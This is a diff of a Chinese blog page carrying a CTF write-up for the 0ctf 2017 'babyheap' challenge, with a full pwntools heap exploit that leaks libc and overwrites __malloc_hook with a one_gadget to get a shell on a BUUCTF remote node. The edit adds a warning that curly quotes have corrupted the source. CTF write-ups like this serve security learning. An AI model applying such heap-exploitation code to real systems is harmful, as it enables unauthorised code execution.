@@ -8,7 +8,8 @@
 也不要说我没用，我怎么说也帮你在一堆讲的不太行的wp里放出了两个还行的。
 总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。
 参考博客1：http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/
-参考博客2：https://blog.csdn.net/xieyichensss/article/details/116071092" />
+参考博客2：https://blog.csdn.net/xieyichensss/article/details/116071092
+特别提醒，源码里面的‘与“不知道为什么复制粘贴过来就变成奇怪的格式，所以除非你愿意一个个改’与”，不建议使用本文源码，上面博客的源码与本文思路相同，可以参考" />
   
 
   
@@ -29,7 +30,7 @@
 <meta property="og:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/1.png">
 <meta property="og:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/2.png">
 <meta property="article:published_time" content="2021-09-21T15:45:03.000Z">
-<meta property="article:modified_time" content="2021-09-22T07:32:38.526Z">
+<meta property="article:modified_time" content="2021-09-22T07:43:29.788Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/1.png">
@@ -90,7 +91,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktv6vicn0001q0vk6asd93hk" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktv79gu00000osvkbtt2hohw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -101,16 +102,15 @@
 <p>总的来说博客2更详细一点，稍微更推荐博客2一点，博客1在malloc_hook那边动手调了一下，各有所长吧，肯定比大部分要搜到的奇怪wp要好很多。</p>
 <p>参考博客1：<a target="_blank" rel="noopener" href="http://pearcechn.top/2021/02/02/[writeup]buuctf-pwnheap_1/">http://pearcechn.top/2021/02/02/%E3%80%90writeup%E3%80%91buuctf-pwnheap_1/</a></p>
 <p>参考博客2：<a target="_blank" rel="noopener" href="https://blog.csdn.net/xieyichensss/article/details/116071092">https://blog.csdn.net/xieyichensss/article/details/116071092</a></p>
+<p><strong>特别提醒，源码里面的‘与“不知道为什么复制粘贴过来就变成奇怪的格式，所以除非你愿意一个个改’与”，不建议使用本文源码，上面博客的源码与本文思路相同，可以参考</strong></p>
 <span id="more"></span>
 
-<h1 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”1”)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”2”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
+<h1 id="1-源码（请注意看前言的特别提醒！！！！！！！）"><a href="#1-源码（请注意看前言的特别提醒！！！！！！！）" class="headerlink" title="1.源码（请注意看前言的特别提醒！！！！！！！）"></a>1.源码（请注意看前言的特别提醒！！！！！！！）</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”1”)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”2”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
 <p>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x80)</p>
 <p>free(1)<br>free(2)</p>
 <p>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>payload += p64(0)*3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)<br>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)*3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)</p>
 <p>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78#0x3c4b20+0x58=0x3cb78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)*3+p64(0)*2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)<br>#gdb.attach(p)<br>alloc(0x255)</p>
 <p>p.interactive()</p>
-<p>直接复制粘贴的话，首先远程的话去buu下了他的libc放到同一个文件夹里肯定是能跑的，如果本地跑不了因为环境等等因素很多，不要来问我为什么，我也不清楚。</p>
-<p>其次这一题的话要注意使用的libc版本，我是直接用16的ubuntu做的</p>
 <h1 id="2-一点点基础知识"><a href="#2-一点点基础知识" class="headerlink" title="2.一点点基础知识"></a>2.一点点基础知识</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点</p>
 <p>如果你学到堆题，却连chunk的数据结构都不清楚，我个人也不是很推荐你继续埋头刷题了。</p>
 <p>然后有些人可能不知道去哪里学习这些堆的基础内容，我个人的建议是ctfwiki有一个较为完整的框架，可以去看看，但观感就像老师纯念ppt一样，堆一些新手可能不是很友好，所以b站直接搜pwn其实也有不少讲的还行的培训，两者搭配起来，只论底层原理的话感觉也不算很难，应该很容易就可以搞定了。</p>
